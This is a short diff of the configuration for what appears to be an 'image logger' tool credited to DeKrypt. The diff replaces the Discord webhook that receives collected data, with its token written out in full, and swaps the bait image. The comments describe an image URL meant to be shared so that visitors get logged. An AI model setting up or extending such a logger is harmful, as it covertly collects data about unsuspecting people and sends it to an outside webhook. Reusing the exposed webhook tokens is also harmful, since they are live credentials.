@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1385656444669526086/6oPhk2ciEuu338aNFjAUKyGDrVyNJvf44lDvhsMpBfhZuBJyfO5MAnshANHpXEdKLuG3",
-    "image": "https://upload.wikimedia.org/wikipedia/commons/7/7a/SpongeBob_SquarePants_character.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1385815082788716544/CN5HUR-Q18ISvzMbT1xS4TJoeSsNUE3JPHcYqSTQ-aSvJQz8r2whLtQCWTuERpp_dWX6",
+    "image": "https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F81a7a9c8-13c9-4cf6-9307-1bc21f13d674_600x338.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
